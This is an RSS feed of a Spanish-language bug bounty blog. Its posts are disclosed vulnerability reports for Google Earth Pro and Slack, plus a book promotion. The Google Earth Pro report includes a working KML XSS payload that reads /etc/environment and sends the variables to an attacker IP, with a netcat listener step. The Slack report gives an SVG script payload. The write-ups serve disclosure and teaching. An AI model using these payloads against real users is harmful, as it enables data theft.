@@ -1,0 +1,360 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>@omespino</title>
+	<atom:link href="/es/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>just another security blog.</description>
+	<lastBuildDate>Tue, 18 Jan 2022 19:18:16 +0000</lastBuildDate>
+	<language>es-MX</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.9.3</generator>
+
+<image>
+	<url>/wp-content/uploads/2020/12/cropped-dddd-32x32.png</url>
+	<title>@omespino</title>
+	<link>/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>BUG BOUNTY EN ESPAÑOL &#8211; GOOGLE VRP: VARIABLES DE ENTORNO DE LINUX EXFILTRADAS EN APLICACIÓN DE GOOGLE EARTH PRO &#8211; $1,337 DLLS</title>
+		<link>/es/bug-bounty-en-espanol-google-vrp-variables-de-entorno-de-linux-exfiltradas-en-aplicacion-de-google-earth-pro-1337-dlls/</link>
+					<comments>/es/bug-bounty-en-espanol-google-vrp-variables-de-entorno-de-linux-exfiltradas-en-aplicacion-de-google-earth-pro-1337-dlls/#respond</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Tue, 18 Jan 2022 19:18:14 +0000</pubDate>
+				<category><![CDATA[Sin categoría]]></category>
+		<guid isPermaLink="false">/?p=1986</guid>
+
+					<description><![CDATA[Introducción: Hola a todos. Ha pasado un tiempo desde mi última publicación, pero estoy de regreso. Quiero contarles una historia muy breve sobre uno de mis últimos errores y cómo logré exfiltrar las variables locales de /etc/environment en la aplicación de escritorio de Google Earth Pro en Linux. Si estás interesado en reportes 100% reales [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p><br><strong>Introducción:</strong></p>
+
+
+
+<p>Hola a todos. Ha pasado un tiempo desde mi última publicación, pero estoy de regreso. Quiero contarles una historia muy breve sobre uno de mis últimos errores y cómo logré exfiltrar las variables locales de /etc/environment en la aplicación de escritorio de Google Earth Pro en Linux.<br><br></p>
+
+
+
+<p class="has-text-align-center"><em>Si estás interesado en reportes 100% reales de Bug Bounty, por favor mira mi libro <a rel="noreferrer noopener" href="/es/bug-bounty-espanol/" data-type="URL" data-id="/es/bug-bounty-espanol/" target="_blank">Bug Bounty en Español</a><br></em></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="/es/bug-bounty-espanol/" target="_blank" rel="noopener"><img src="/wp-content/uploads/2022/01/BBEBANNER-1024x717-1.png" alt="" class="wp-image-1951" width="417" height="292" srcset="/wp-content/uploads/2022/01/BBEBANNER-1024x717-1.png 1024w, /wp-content/uploads/2022/01/BBEBANNER-1024x717-1-300x210.png 300w, /wp-content/uploads/2022/01/BBEBANNER-1024x717-1-768x538.png 768w, /wp-content/uploads/2022/01/BBEBANNER-1024x717-1-200x140.png 200w" sizes="(max-width: 417px) 100vw, 417px" /></a></figure></div>
+
+
+
+<p><br><strong>Extraído del informe de Google VRP: (el informe real de Google VRP)</strong></p>
+
+
+
+<p><em>Resumen: Variables locales de archivo /etc/enviroment exfiltradas en la aplicación de escritorio Linux Google Earth Pro</em></p>
+
+
+
+<p><em>Pasos para reproducir:</em></p>
+
+
+
+<p><em>1.- Descarga e instala la última aplicación Google Earth Pro Desktop para macOS (7.3.3.7786 64-bit / .deb)</em></p>
+
+
+
+<p><em>2.- Pon tu servidor atacante a la escucha en cualquier puerto con netcat, en mi caso el puerto 80:</em></p>
+
+
+
+<pre class="wp-block-code"><code> localh0st:~ user$ sudo nc -l -p 80</code></pre>
+
+
+
+<p><em>3.- Abre el archivo adjunto <em><a href="https://drive.google.com/file/d/1yokdqGwWOQ3GJc7VQPruNjdOkrVUequx/view">etc_environment.kml</a></em> y modifica la parte donde está CDATA y pon tu IP del servidor atacante y guárdalo. (extracto de ese archivo y código XSS real):</em></p>
+
+
+
+<pre class="wp-block-code"><code>&lt;Placemark&gt;                                                                        &lt;name&gt;placemark&lt;/name&gt;&lt;description&gt;                                                                                  &lt;!&#91;CDATA&#91;                                                                                           &lt;script src=file:../../../../../../../etc/environment&gt;&lt;/script&gt;                                                                                            &lt;script&gt;                                                                                    document.write('XSS fired :-)&lt;br&gt;');                                                                       document.write('Location: ' + location.href + '&lt;br&gt;');                                       document.write('&lt;br&gt;PATH var = ' + PATH);                                          document.write('&lt;br&gt;JAVA_HOME var = ' + JAVA_HOME);                                                                   document.write('&lt;img src=http://192.168.0.11/?path=' + PATH + '&amp;java_home=' + JAVA_HOME + '&gt;'); &lt;/script&gt;                                                                                               ]]&gt;&lt;/description&gt;</code></pre>
+
+
+
+<p><br><em>4.- Simplemente abre el archivo etc_environment.kml con un doble clic, una vez que vea el polígono rojo, haga clic en él para ver la descripción y el XSS se disparará, contiene las variables del archivo de sistema /etc/environment y las enviaría al servidor atacante</em><br></p>
+
+
+
+<figure class="wp-block-image"><a href="/wp-content/uploads/2021/11/etc_environment_ge_linux.jpg"><img src="/wp-content/uploads/2021/11/etc_environment_ge_linux.jpg" alt="" class="wp-image-772"/></a></figure>
+
+
+
+<p><em>5.- Bingo.</em></p>
+
+
+
+<p><em>Explicación: dado que podemos inyectar código HTML/js aleatorio, podemos &#8220;importar&#8221; archivos con la etiqueta de script, por ejemplo &#8220;&lt;script src=file:///../../../../etc/enviroment&gt;&lt;/script&gt;&#8221;, por lo que si el archivo tiene el formato js correcto, el navegador cargará cualquier contenido.</em><br><br><em>Ya que el formato común de /etc/environment es:</em></p>
+
+
+
+<pre class="wp-block-code"><code>PATH="/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin" 
+JAVA_HOME="/opt/jre/bin"</code></pre>
+
+
+
+<p><br><em>Esto en realidad se cargaría porque esas variables tienen el mismo formato que las variables de javascript ;-), además, dado que cualquier variable de entorno de Linux es tan predecible, podemos aplicar fuerza bruta a los nombres de variables más comunes y enviarlas al servidor atacante.</em></p>
+
+
+
+<p><br>ACTUALIZACIÓN: También podrías exfiltrar todas las variables del archivo /etc/environment ya que &#8220;Object.keys(window)&#8221; cargaría cualquier variable declarada en el DOM (referencia de <a href="https://stackoverflow.com/a/17276249">stack overflow</a>)<br><br></p>
+
+
+
+<figure class="wp-block-image"><a href="/wp-content/uploads/2021/11/etc_environment_DOM.png"><img src="/wp-content/uploads/2021/11/etc_environment_DOM.png" alt="" class="wp-image-772"/></a></figure>
+
+
+
+<p><strong>Escenario de Ataque:<br></strong><br>Cualquier atacante puede leer variables arbitrarias de <strong>/etc/environment</strong> en Linux en la aplicación Google Earth Pro Desktop a través de un XSS.</p>
+
+
+
+<p><strong><strong>Cronología del Reporte:</strong></strong></p>
+
+
+
+<p>• 23 de agosto de 2021: &#8220;Nice catch&#8221;, fallo aceptado (P4 → P3)<br>• 23 de agosto de 2021: Recibí un mensaje de Google de que el fallo no era un fallo, y que era un comportamiento esperado.<br>• 01 de septiembre de 2021: Envié un mensaje de aclaración y luego el problema se envió de nuevo a revisión.<br>• 09 de septiembre de 2021: Recompensa de $1,337 dlls.<br>• 03 de octubre de 2021: Recibí un mensaje de Google de que el informe de problemas se cerró sin proporcionar una solución (el estado &#8220;no se solucionará&#8221;) ¡¿Qué?! jajaja.</p>
+
+
+
+<p>Bueno, eso es todo, si tienes alguna duda, comentario o sugerencia escríbeme aquí o en Twitter @omespino, nos leemos luego.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/es/bug-bounty-en-espanol-google-vrp-variables-de-entorno-de-linux-exfiltradas-en-aplicacion-de-google-earth-pro-1337-dlls/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>BUG BOUNTY EN ESPAÑOL &#8211; $ 1,000 DLLS EN 5 MINUTOS, XSS ALMACENADO EN FILES.SLACK.COM A TRAVÉS DE ARCHIVO XML / SVG EN IOS &#8211; (JUN 2019)</title>
+		<link>/es/bug-bounty-en-espanol-1000-usd-en-5-minutos-xss-almacenado-en-files-slack-com-a-traves-de-archivo-xml-svg-en-ios-jun-2019/</link>
+					<comments>/es/bug-bounty-en-espanol-1000-usd-en-5-minutos-xss-almacenado-en-files-slack-com-a-traves-de-archivo-xml-svg-en-ios-jun-2019/#respond</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Thu, 06 Jan 2022 23:23:57 +0000</pubDate>
+				<category><![CDATA[Sin categoría]]></category>
+		<guid isPermaLink="false">/?p=1793</guid>
+
+					<description><![CDATA[Introducción: Hola a todos, ha pasado un tiempo desde mi última publicación, pero he vuelto, quiero contarles una breve historia sobre el programa de recompensas de errores de Slack y por qué siempre debes verificar las técnicas básicas de seguridad porque te sorprenderás, algunas veces funcionan. Este articulo apareció primero en el libro Bug Bounty [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>I<strong>ntroducción:</strong></p>
+
+
+
+<p><br>Hola a todos, ha pasado un tiempo desde mi última publicación, pero he vuelto, quiero contarles una breve historia sobre el programa de recompensas de errores de Slack y por qué siempre debes verificar las técnicas básicas de seguridad porque te sorprenderás, algunas veces funcionan.<br><br></p>
+
+
+
+<p class="has-text-align-center"><em>Este articulo apareció primero en el libro <a rel="noreferrer noopener" href="/es/bug-bounty-espanol/" data-type="URL" data-id="/es/bug-bounty-espanol/" target="_blank">Bug Bounty en Español</a><br></em></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="/es/bug-bounty-espanol/" target="_blank" rel="noopener"><img loading="lazy" src="/wp-content/uploads/2022/01/BBEBANNER-1024x717-1.png" alt="" class="wp-image-1951" width="417" height="292" srcset="/wp-content/uploads/2022/01/BBEBANNER-1024x717-1.png 1024w, /wp-content/uploads/2022/01/BBEBANNER-1024x717-1-300x210.png 300w, /wp-content/uploads/2022/01/BBEBANNER-1024x717-1-768x538.png 768w, /wp-content/uploads/2022/01/BBEBANNER-1024x717-1-200x140.png 200w" sizes="(max-width: 417px) 100vw, 417px" /></a></figure></div>
+
+
+
+<p><br><strong>Título:</strong> XSS almacenado en https://files.slack.com/ aplicación iOS / navegadores iOS a través de xml / archivo svg.<br><br><strong>Producto / URL: </strong>Aplicación Slack iOS / navegadores iOS</p>
+
+
+
+<p><br>Reporte enviado a través del programa hackerone de Slack (extracto del reporte original):</p>
+
+
+
+<p><br>Hola, equipo de seguridad de Slack:<br><br>Encontré un XSS almacenado en https://files.slack.com/ mediante la aplicación de Slack de iOS / navegadores iOS a través de un archivo xml / svg.<br><br>Prueba de concepto:<br><br>1.- Inicia sesión en Slack y carga un archivo xml con el siguiente contenido en cualquier canal de slack (archivo slack-xss.xml adjunto):</p>
+
+
+
+<pre class="wp-block-code"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+&lt;script&gt;prompt(document.location)&lt;/script&gt;
+&lt;/svg&gt;
+</code></pre>
+
+
+
+<p><br>2.- Busca el archivo xml en la aplicación iOS, haz clic en él para abrir la “Vista modo texto” y luego abre la opción “Ver en el navegador” y mira el XSS.<br><br>3.- También en la “Vista modo texto” puedes copiar el enlace para acceder rápidamente a ese archivo. (Ten en cuenta que si deseas enviar el enlace en algún canal slack, debes pegar el enlace copiado y agregar un espacio + cadena, por ejemplo, &#8220;https://files.slack.com/archivos-pri/XXXXXXXXX-XXXXXXXXX/ slack-xss.xml XSS”.<br><br></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter"><img src="/wp-content/uploads/2021/07/slack_xss_omespino.png" alt="" class="wp-image-430"/></figure></div>
+
+
+
+<p><br>Algo importante a destacar es: en este momento tienes un ‘enlace mágico’ que apunta directamente al documento XML malicioso.<br><br>4.- Al abrir el enlace directamente en Safari de iOS aparece el XSS (si abres el enlace en cualquier navegador iOS como Safari, Firefox, Chrome, Opera, el XSS funciona, solo necesitas iniciar sesión en tu cuenta slack, solo funciona en iOS).<br><br><strong>Impacto:</strong><br><br>Un XSS almacenado permite que un atacante pueda insertar scripts maliciosos y arbitrarios en una página vulnerable, que luego se ejecutan cuando una víctima visualiza la página.</p>
+
+
+
+<p><strong>Entorno:<br></strong><br>iPhone 6 &#8211; iOS v11.2.5<br>Safari Última versión<br>Google Chrome Última versión<br>Mi espacio de trabajo de slack / cuenta personal<br><br><strong>Salón de la fama de Slack  (Junio de 2019):</strong><br><a rel="noreferrer noopener" href="https://hackerone.com/slack/thanks/2018?type=team" target="_blank">https://hackerone.com/slack/thanks/2019?type=team</a><br><br><strong><br>Cronología del Reporte:</strong><br>• 5 de febrero de 2018: Reporte enviado al equipo de Slack<br>• 13 de febrero de 2018: Recibí un mensaje del equipo de Slack que decía que el error había sido evaluado como nivel Crítico / Alto [High (7 ~ 8,9)]<br>• 14 de febrero de 2019: Recompensa de $ 1,000 dlls (Si, ¡Casi un año después! w0000t!)<br>• 5 de junio de 2019: Solucionado por el equipo de Slack</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/es/bug-bounty-en-espanol-1000-usd-en-5-minutos-xss-almacenado-en-files-slack-com-a-traves-de-archivo-xml-svg-en-ios-jun-2019/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>LIBRO &#8211; Bug bounty En Español &#8211; OMAR ESPINO</title>
+		<link>/es/bug-bounty-espanol/</link>
+					<comments>/es/bug-bounty-espanol/#respond</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Mon, 03 Jan 2022 18:32:25 +0000</pubDate>
+				<category><![CDATA[Sin categoría]]></category>
+		<guid isPermaLink="false">/?p=1711</guid>
+
+					<description><![CDATA[Bug Bounty En Español &#8211; omespino: Más de $$$$$ dlls en recompensas por hackear a grandes compañías de manera legal: Descripción: Con el paso de los fallos, he sido incluido en el salón de la fama de empresas como Google (investigador top 100 a nivel mundial), Microsoft, Facebook, Twitter, Slack, Netflix, Sony, Nokia, Telegram, etc. [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p><strong>Bug Bounty En Español &#8211; omespino: Más de $$$$$ dlls en recompensas por hackear a grandes compañías de manera legal:</strong><br><br></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/wp-content/uploads/2022/01/BBE-DIGITAL-1.jpg" target="_blank" rel="noopener"><img loading="lazy" src="/wp-content/uploads/2022/01/BBE-DIGITAL-1-663x1024.jpg" alt="" class="wp-image-1945" width="332" height="512" srcset="/wp-content/uploads/2022/01/BBE-DIGITAL-1-663x1024.jpg 663w, /wp-content/uploads/2022/01/BBE-DIGITAL-1-194x300.jpg 194w, /wp-content/uploads/2022/01/BBE-DIGITAL-1-768x1186.jpg 768w, /wp-content/uploads/2022/01/BBE-DIGITAL-1-129x200.jpg 129w, /wp-content/uploads/2022/01/BBE-DIGITAL-1.jpg 874w" sizes="(max-width: 332px) 100vw, 332px" /></a></figure></div>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p><br><br><strong>Descripción:</strong></p>
+
+
+
+<p>Con el paso de los fallos, he sido incluido en el salón de la fama de empresas como Google (investigador top 100 a nivel mundial), Microsoft, Facebook, Twitter, Slack, Netflix, Sony, Nokia, Telegram, etc.</p>
+
+
+
+<p>La finalidad de compartir mis experiencias como aficionado en este escrito, es motivar a las personas y descubran que todos somos capaces de hackear a grandes empresas y llegar a lograr grandes recompensas, ningún logro es pequeño, si yo pude, tú también puedes.</p>
+
+
+
+<p>En este libro tendrás la descripción de vulnerabilidades y su desarrollo paso a paso, fallos que acumularon más de<br>$$$$$ dólares en recompensas de manera legal, totalmente en español.</p>
+
+
+
+<p></p>
+
+
+
+<p><br><br><strong>Tabla de Contenido:</strong></p>
+
+
+
+<p></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/wp-content/uploads/2022/01/bbe-contenido-1.jpg"><img loading="lazy" src="/wp-content/uploads/2022/01/bbe-contenido-1-1024x783.jpg" alt="" class="wp-image-1947" width="512" height="392" srcset="/wp-content/uploads/2022/01/bbe-contenido-1-1024x783.jpg 1024w, /wp-content/uploads/2022/01/bbe-contenido-1-300x229.jpg 300w, /wp-content/uploads/2022/01/bbe-contenido-1-768x587.jpg 768w, /wp-content/uploads/2022/01/bbe-contenido-1-1536x1174.jpg 1536w, /wp-content/uploads/2022/01/bbe-contenido-1-2048x1565.jpg 2048w, /wp-content/uploads/2022/01/bbe-contenido-1-1250x955.jpg 1250w, /wp-content/uploads/2022/01/bbe-contenido-1-200x153.jpg 200w" sizes="(max-width: 512px) 100vw, 512px" /></a></figure></div>
+
+
+
+<p><br><br><strong>Detalles:</strong></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/wp-content/uploads/2022/01/Screen-Shot-2022-01-12-at-4.55.06-PM.jpg"><img loading="lazy" src="/wp-content/uploads/2022/01/Screen-Shot-2022-01-12-at-4.55.06-PM-1024x190.jpg" alt="" class="wp-image-1949" width="512" height="95" srcset="/wp-content/uploads/2022/01/Screen-Shot-2022-01-12-at-4.55.06-PM-1024x190.jpg 1024w, /wp-content/uploads/2022/01/Screen-Shot-2022-01-12-at-4.55.06-PM-300x56.jpg 300w, /wp-content/uploads/2022/01/Screen-Shot-2022-01-12-at-4.55.06-PM-768x142.jpg 768w, /wp-content/uploads/2022/01/Screen-Shot-2022-01-12-at-4.55.06-PM-1250x232.jpg 1250w, /wp-content/uploads/2022/01/Screen-Shot-2022-01-12-at-4.55.06-PM-200x37.jpg 200w, /wp-content/uploads/2022/01/Screen-Shot-2022-01-12-at-4.55.06-PM.jpg 1284w" sizes="(max-width: 512px) 100vw, 512px" /></a></figure></div>
+
+
+
+<p><br><br><strong>Disponible en: </strong></p>
+
+
+
+<p><br><strong>9.99 USD en amazon.com formato físico, 3.99 USD eBook kindle</strong></p>
+
+
+
+<figure class="wp-block-image is-resized">
+ <a href="https://www.amazon.com/dp/B09PHJRMCN" taget="_blank">
+<img loading="lazy" src="http://centropokemon.com.ar/cutenews/data/upimages/logo_amazon.png" alt="" width="256" height="65"></a></figure>
+
+
+
+<p><a rel="noreferrer noopener" href="https://www.amazon.com/dp/B09PHJRMCN" target="_blank">https://www.amazon.com/dp/B09PHJRMCN<br></a><br></p>
+
+
+
+<p><strong>2.99 USD (59.99 MXN) en PayPal <meta charset="utf-8">formato digital en PDF<br></strong></p>
+
+
+
+<p>Al finalizar tu compra con paypal recibirás el libro en digital en un periodo menor a 24 hrs.<br><div ><form target='_blank' action='https://www.paypal.com/cgi-bin/webscr' method='post'><input type='hidden' name='cmd' value='_xclick' /><input type='hidden' name='business' value='CHR56JPAWJUUQ' /><input type='hidden' name='item_name' value='Bug' /><input type='hidden' name='currency_code' value='USD' /><input type='hidden' name='amount' value='2.98' /><input type='hidden' name='lc' value='EN_US'><input type='hidden' name='no_note' value=''><input type='hidden' name='paymentaction' value='sale'><input type='hidden' name='return' value='' /><input type='hidden' name='bn' value='WPPlugin_SP'><input type='hidden' name='cancel_return' value='' /><input style='border: none;' class='paypalbuttonimage' type='image' src='https://www.paypalobjects.com/webstatic/en_US/i/buttons/buy-logo-medium.png' border='0' name='submit' alt='Make your payments with PayPal. It is free, secure, effective.'><img alt='' border='0' style='border:none;display:none;' src='https://www.paypal.com/EN_US/i/scr/pixel.gif' width='1' height='1'></form></div></p>
+
+
+
+<p><br><strong>1.99 USD con bitcoin BTC formato digital en PDF<br></strong><br>3M7pmdp6sbjBLGUfY3snUUj7ZoFtxeFekJ</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="/wp-content/uploads/2022/01/bitcoin.png"><img loading="lazy" src="/wp-content/uploads/2022/01/bitcoin-1024x258.png" alt="" class="wp-image-1757" width="256" height="65"/></a></figure>
+
+
+
+<p><br><strong>1.99 USD con ethereum ETH formato digital en PDF<br></strong><br>0x4a9e86451ae756d978f320d88ba3cef01ecebc2a</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="/wp-content/uploads/2022/01/eth_logo.jpg"><img loading="lazy" src="/wp-content/uploads/2022/01/eth_logo.jpg" alt="" class="wp-image-1757" width="256" height="65"/></a></figure>
+
+
+
+<p><br>Al finalizar tu compra con bitcoin envía un correo electrónico a om.espino+btc@gmail.com y recibirás el libro en digital en un periodo menor a 24 hrs.<br><br>Si tienes algún comentario o alguna duda, escríbeme un comentario directo en esta página, por correo om.espino+soporte@gmail.com o en buscamente en Twitter. (<a rel="noreferrer noopener" href="https://twitter.com/omespino" target="_blank">@omespino</a>)<br><br></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/es/bug-bounty-espanol/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>H0L4 Mundo!</title>
+		<link>/es/hol4-mundo/</link>
+					<comments>/es/hol4-mundo/#respond</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Tue, 29 Jun 2021 19:32:00 +0000</pubDate>
+				<category><![CDATA[Sin categoría]]></category>
+		<guid isPermaLink="false">/?p=1288</guid>
+
+					<description><![CDATA[Hola, bienvenido a mi pequeño espacio en Internet. Este es solo otro blog de seguridad por mi, Omar Espino ¿De qué trata el blog? Principalmente Bug Bounties, artículos de seguridad y artículos de CTF. Si tienes algún comentario o alguna duda, escríbeme por mensaje directo en esta página, por correo hello@omespino.com o en Twitter. (@omespino)]]></description>
+										<content:encoded><![CDATA[<p> Hola, bienvenido a mi pequeño espacio en Internet. Este es solo otro blog de seguridad por mi, Omar Espino</p>
+
+
+<div class="wp-block-image"><figure class="aligncenter size-medium"><a href="https://twitter.com/intent/user?screen_name=omespino" target="_blank" rel="noopener"><img class="circular-square" style="height: 240px; width: auto"
+src="/wp-content/uploads/2021/01/GoelVTo4_400x400.jpg" alt="" class="wp-image-758"/></a></figure></div>
+
+
+<p> ¿De qué trata el blog? Principalmente Bug Bounties, artículos de seguridad y artículos de CTF.</p>
+<p>Si tienes algún comentario o alguna duda, escríbeme por mensaje directo en esta página, por correo hello@omespino.com o en Twitter. (<a href="https://twitter.com/intent/user?screen_name=omespino">@omespino</a>)</p>]]></content:encoded>
+					
+					<wfw:commentRss>/es/hol4-mundo/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
